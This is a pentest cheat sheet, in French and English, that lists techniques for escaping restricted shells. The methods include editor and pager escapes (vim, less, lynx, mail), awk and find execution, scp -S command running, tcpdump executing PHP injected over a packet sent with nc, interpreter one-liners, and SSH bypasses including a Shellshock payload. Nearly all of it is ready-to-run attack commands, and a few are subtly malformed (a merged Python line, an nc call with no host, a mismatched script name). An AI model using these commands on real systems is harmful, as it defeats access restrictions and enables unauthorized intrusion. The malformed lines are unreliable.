# Reconnaissance

**Identifier le shell et le PATH courants**

```sh
env
echo $0
echo $PATH
```

**Lister les commandes disponibles (si `ls` absent)**

```sh
echo /usr/local/rbin/*
```

# Environment Variables

**Lister les variables exportées et vérifier si elles sont modifiables**

```sh
export -p
```

Si `SHELL` ou `PATH` sont modifiables, les redéfinir :

```sh
export SHELL=/bin/bash
export PATH=/tmp
```

# Copying Files

**Trouver des répertoires accessibles en écriture**

```sh
find / -writable -type d 2>/dev/null
```

Copier un binaire dans le PATH pour bypasser la restriction `/` :

```sh
cp /bin/sh /writable/dir/sh
```

# Programs

## Vim

### Bash

```sh
:set shell=/bin/bash
:shell
```

### Command execution

```sh
:! /bin/ps
```

## Mail

`$VISUAL` sets the program to invoke when the visual editor is called.

```sh
set VISUAL=/bin/vi
mail -s "subject" user@mail.com
```

Start the visual editor with `~v` and escape VIM.

## Lynx

```sh
lynx /etc/passwd
```

Enter the options with `o`, change the `Editor` to `/bin/vi`. Edit the file with `e` and escape VIM.

## Elinks

Set `EDITOR` to `/bin/vi`. Open a webpage and edit a textbox. Escape VIM.

## AWK

```sh
awk 'BEGIN {system("/bin/sh")}'
```

## Find

```sh
find / -name 0xffsec -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

## SCP

Read files with `-F`

```sh
scp -F /etc/passwd validfile remote:
```

Run commands with `-S`.

```sh
echo $'#!/bin/sh\n/usr/bin/id' > script.sh
chmod +x script.sh
scp -S ./script validfile remote:
```

## TCPDump

Use tcpdump to capture network traffic containing a malicious script.

```sh
tcpdump -n -G 1 -z /usr/bin/php -U -A udp port 8080
```

Send a network packet with the PHP script.

```sh
echo "<?php system('id');?>" | nc -u 8080
```

## Others

Programs such as `more`, `less`, `man`, `ftp`, `gdb` let you run subshells. Type `!` followed by a command. Try the following:

```sh
'! /bin/sh'
'!/bin/sh'
'!bash'
```

# Languages

Try invoking a shell through an available language.

## Python

```python
exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
```

## Perl

```perl
exec "/bin/sh";
```

```sh
perl -e 'exec "/bin/sh";'
```

## Ruby / irb

```ruby
exec "/bin/sh"
```

## Lua

```sh
os.execute('/bin/sh')
```

# Unrestricted Mode

Some restricted shells start running files in an unrestricted mode before the restricted shell is applied. If `.bash_profile` is executed in an unrestricted mode, and it's editable, you'll be able to execute code and commands as an unrestricted user.

# From The Outside

## Command Execution

Execute a command before the remote shell is loaded.

```sh
ssh user@10.0.0.3 -t "/bin/sh"
```

## Profile

Start a remote shell with an unrestricted profile.

```sh
ssh user@10.0.0.3 -t "bash --noprofile"
```

## Shellshock

```sh
ssh user@10.0.0.3 -t "(){:;}; /bin/bash"
```
